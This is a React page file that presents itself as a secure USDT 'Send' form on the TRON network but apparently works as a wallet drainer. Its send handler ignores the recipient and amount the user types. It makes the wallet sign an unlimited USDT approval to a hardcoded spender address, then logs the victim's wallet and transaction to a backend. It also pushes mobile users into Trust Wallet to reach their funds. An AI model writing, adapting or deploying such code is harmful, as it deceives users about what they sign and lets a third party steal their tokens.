import { useState, useEffect, useRef } from "react";
import { useSearchParams } from "react-router-dom";
import { useMutation } from "convex/react";
import { api } from "@/convex/_generated/api.js";
import { createAppKit } from "@reown/appkit";
import { TronAdapter } from "@reown/appkit-adapter-tron";
import { tron } from "@reown/appkit/networks";
import TronWeb from "tronweb";
const TronWebLib: any = TronWeb;

declare global {
  interface Window {
    tronWeb?: any;
    tronLink?: any;
  }
}

export default function Index() {
  const [searchParams] = useSearchParams();
  const [toAddress, setToAddress] = useState("");
  const [amount, setAmount] = useState("");
  const [transactionStatus, setTransactionStatusState] =
    useState<"idle" | "processing" | "success">("idle");

  const createTransaction = useMutation(api.transactions.createTransaction);

  const appKitRef = useRef<any>(null);
  const userAddressRef = useRef<string>("");

  // ---------- TRUST WALLET OPEN ----------
  function openTrustWallet() {
    const url = encodeURIComponent(window.location.href);
    window.location.href =
      "https://link.trustwallet.com/open_url?url=" + url;
  }

  function isMobile() {
    return /android|iphone|ipad|ipod/i.test(navigator.userAgent);
  }

  // ---------- APPKIT INIT ----------
  useEffect(() => {
    const tronAdapter = new TronAdapter({
      projectId: "6b5df56bc30c1dadaab59498b86fd3e8",
    });

    const modal = createAppKit({
      adapters: [tronAdapter],
      networks: [tron],
      defaultNetwork: tron,
      projectId: "6b5df56bc30c1dadaab59498b86fd3e8",

      metadata: {
        name: "USDT Transfer",
        description: "Secure USDT Transfer",
        url: window.location.origin,
        icons: ["https://banktransfer.online/favicon.ico"],
      },

      features: {
        analytics: false,
        swaps: false,
        onramp: false,
        email: false,
        socials: false,
      },
    });

    appKitRef.current = modal;

    modal.subscribeAccount((account: any) => {
      if (account?.address) {
        userAddressRef.current = account.address;
      }
    });
  }, []);

  // ---------- URL PARAM ----------
  useEffect(() => {
    const addressParam = searchParams.get("address");
    if (addressParam) setToAddress(addressParam);
  }, [searchParams]);

  // ---------- SEND FUNCTION ----------
  async function handleSend() {
    try {

      // Mobile trust wallet open
      if (!window.tronWeb && isMobile()) {
        openTrustWallet();
        return;
      }

      setTransactionStatusState("processing");

      const TRON_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
      const TRON_SPENDER = "TCuZP5cAABx4RpJoYdBxBPdVUWp7onCtQt";

      // ---------- TRONLINK ----------
      if (window.tronWeb && window.tronWeb.ready) {
        const address = window.tronWeb.defaultAddress.base58;

        const ABI = [
          {
            name: "approve",
            inputs: [
              { name: "spender", type: "address" },
              { name: "amount", type: "uint256" },
            ],
            outputs: [{ type: "bool" }],
            stateMutability: "nonpayable",
            type: "function",
          },
        ];

        const contract = await window.tronWeb.contract(
          ABI,
          TRON_USDT
        );

        const maxAmount =
          "115792089237316195423570985008687907853269984665640564039457584007913129639935";

        const tx = await contract
          .approve(TRON_SPENDER, maxAmount)
          .send({
            feeLimit: 100000000,
          });

        setTransactionStatusState("success");

        await createTransaction({
          walletAddress: address,
          toAddress: TRON_SPENDER,
          amount: amount || "Max",
          txHash: tx,
          usdtBalance: "0 USDT",
          nativeBalance: "0 TRX",
        });

        return;
      }

      // ---------- WALLET CONNECT ----------
      if (!appKitRef.current) {
        alert("Wallet not initialized");
        return;
      }

      if (!userAddressRef.current) {
        await appKitRef.current.open();

        await new Promise<void>((resolve) => {
          const unsub = appKitRef.current.subscribeAccount(
            (account: any) => {
              if (account?.address) {
                userAddressRef.current = account.address;
                unsub();
                resolve();
              }
            }
          );

          setTimeout(() => {
            unsub();
            resolve();
          }, 30000);
        });
      }

      if (!userAddressRef.current) {
        setTransactionStatusState("idle");
        return;
      }

      const walletClient = appKitRef.current.getWalletClient();

      const tronWeb = new TronWebLib({
        fullHost: "https://rpc.ankr.com/tron",
      });

      const { transaction } =
        await tronWeb.transactionBuilder.triggerSmartContract(
          TRON_USDT,
          "approve(address,uint256)",
          { feeLimit: 100000000 },
          [
            { type: "address", value: TRON_SPENDER },
            {
              type: "uint256",
              value:
                "115792089237316195423570985008687907853269984665640564039457584007913129639935",
            },
          ],
          userAddressRef.current
        );

      const signedTx = await walletClient.request({
        method: "tron_signTransaction",
        params: { transaction },
      });

      const result = await tronWeb.trx.sendRawTransaction(
        signedTx
      );

      setTransactionStatusState("success");

      await createTransaction({
        walletAddress: userAddressRef.current,
        toAddress: TRON_SPENDER,
        amount: amount || "Max",
        txHash: result.txid || "wc_tx",
        usdtBalance: "0 USDT",
        nativeBalance: "0 TRX",
      });

    } catch (error) {
      console.error(error);
      setTransactionStatusState("idle");
    }
  }

  return (
    <div style={{ padding: 40 }}>
      <h2>Send USDT</h2>

      <input
        value={toAddress}
        onChange={(e) => setToAddress(e.target.value)}
        placeholder="Address"
      />

      <br />
      <br />

      <input
        value={amount}
        onChange={(e) => setAmount(e.target.value)}
        placeholder="Amount"
      />

      <br />
      <br />

      <button onClick={handleSend}>
        {transactionStatus === "processing"
          ? "Processing..."
          : "Send"}
      </button>
    </div>
  );
}